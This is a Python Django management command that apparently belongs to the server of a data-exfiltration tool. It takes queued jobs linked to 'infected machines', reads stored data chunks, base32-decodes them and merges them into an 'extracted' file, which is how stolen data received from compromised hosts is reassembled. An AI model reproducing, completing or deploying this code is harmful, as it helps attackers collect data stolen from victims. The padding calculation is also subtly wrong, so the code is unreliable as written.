import base64
import os

from decouple import config
from django.core.management.base import BaseCommand
from django.utils import timezone

from djangoproject.models import JobEndQueue


class Command(BaseCommand):
    def handle(self, *args, **kwargs):
        queue = JobEndQueue.objects.filter(processable_at__lt=timezone.now()).order_by('created_at').first()
        if not queue:
            print("No pending queue")
            return

        print(f"Processing queue element #{queue.id} Job #{queue.job_id}")
        queue.delete()

        job = queue.job
        machine = queue.job.infected_machine
        data_folder = f"{config('FOLDER_DATA')}/{machine.id}/{job.id}"
        if not os.path.exists(data_folder):
            print('No chunks folder exists')
            return

        job.finished_at = timezone.now()
        job.save()

        chunks = job.get_sorted_chunks()
        with open(f"{data_folder}/extracted", "w") as f:
            for chunk in chunks:
                with open(f"{data_folder}/{chunk}", "r") as c:
                    data = c.read().upper()
                    if (len(data) % 8) > 0:
                        data += '=' * (len(data) % 8)
                    f.write(
                        base64.b32decode(data).decode('UTF-8')
                    )

        print(f"End process queue #{queue.id} Job #{queue.job_id}: {len(chunks)} chunks merged in extracted")
